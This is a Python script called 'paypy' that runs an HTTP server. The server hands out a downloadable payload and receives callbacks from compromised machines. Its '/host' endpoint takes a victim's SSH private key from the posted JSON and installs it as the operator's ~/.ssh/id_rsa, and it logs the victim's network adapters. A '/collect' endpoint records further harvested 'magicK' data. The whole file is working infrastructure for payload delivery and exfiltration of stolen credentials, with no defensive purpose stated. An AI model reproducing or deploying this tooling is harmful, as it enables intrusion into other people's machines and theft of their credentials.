#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
from socket import socket, AF_INET, SOCK_DGRAM
from colorama import Fore, Style
from sys import exit, argv, stdout
from time import strftime
import os
import json

class DownloadHandler(SimpleHTTPRequestHandler):
	def end_headers(self):
		filename = self.base_path.split('/')[-1]
		self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
		super().end_headers()

	def log_message(self, format, *args):
		if self.command == 'GET':
			client_ip = self.client_address[0]
			current_time = strftime('%Y-%m-%d %H:%M:%S')
			stdout.write(f'{Fore.RED}[paypy]{Style.RESET_ALL} {current_time} - {client_ip} - {format % args}\n')
			stdout.flush()

	def sanitize_key(self, key):
		if isinstance(key, str):
			key = key.replace('\r\n', '\n').strip()
			key = ''.join([char for char in key if ord(char) < 128])
		return key
		
	def do_POST(self):
		content_length = int(self.headers['Content-Length'])
		post_data = self.rfile.read(content_length)
		current_time = strftime('%Y-%m-%d %H:%M:%S')
		client_ip = self.client_address[0]
		
		stdout.write(f'{Fore.RED}[raw data]{Style.RESET_ALL} {post_data.decode()}\n')
		stdout.flush()
		
		if self.path == '/host':
			stdout.write(f'{Fore.RED}[host]{Style.RESET_ALL} {current_time} - {client_ip} - Host notification received:\n')
			try:
				post_json = json.loads(post_data.decode())
				
				private_key = post_json.get("PrivateKey", "")
				if private_key:
					private_key = self.sanitize_key(private_key)
					os.makedirs(os.path.expanduser("~/.ssh"), exist_ok=True)
					private_key_path = os.path.expanduser("~/.ssh/id_rsa")
					with open(private_key_path, "w") as private_key_file:
						private_key_file.write(private_key + "\n")
					os.chmod(private_key_path, 0o600)
					stdout.write(f'{Fore.GREEN}[success]{Style.RESET_ALL} Private key saved to {private_key_path}\n')
				else:
					stdout.write(f'{Fore.YELLOW}[warning]{Style.RESET_ALL} No private key found in POST data\n')
				
				adapters = post_json.get("Adapters", [])
				if isinstance(adapters, list):
					for adapter in adapters:
						interface = adapter.get("Interface", "")
						ip_address = adapter.get("IPAddress", "")
						if isinstance(interface, str) and isinstance(ip_address, str):
							stdout.write(f'{Fore.BLUE}[adapter]{Style.RESET_ALL} Interface: {interface}, IP: {ip_address}\n')
						else:
							stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Invalid adapter data\n')
				else:
					stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Adapters data is not a list\n')
					
			except json.JSONDecodeError:
				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} Failed to decode JSON from POST data\n')
			except Exception as e:
				stdout.write(f'{Fore.RED}[error]{Style.RESET_ALL} {str(e)}\n')
	
		elif self.path == '/collect':
			stdout.write(f'{Fore.GREEN}[magicK]{Style.RESET_ALL} {current_time} - {client_ip} - Received magicK data:\n{post_data.decode()}\n')
		else:
			stdout.write(f'{Fore.YELLOW}[unknown]{Style.RESET_ALL} {current_time} - {client_ip} - Unknown POST request received:\n{post_data.decode()}\n')
		stdout.flush()
		self.send_response(200)
		self.end_headers()

def get_local_ip():
	s = socket(AF_INET, SOCK_DGRAM)
	s.connect(('8.8.8.8', 80))
	local_ip = s.getsockname()[0]
	s.close()
	return local_ip

if len(argv) != 3:
	print('usage: paypy <port> </payload/path>')
	exit(1)

port = int(argv[1])
file_path = argv[2]
DownloadHandler.base_path = file_path
local_ip = get_local_ip()
httpd = HTTPServer((local_ip, port), DownloadHandler)
print(f'{Fore.RED}[paypy]{Style.RESET_ALL} local server started: {local_ip}:{port}')
print(f'{Fore.RED}[paypy]{Style.RESET_ALL} downloadable payload: {file_path}')
stdout.flush()
httpd.serve_forever()
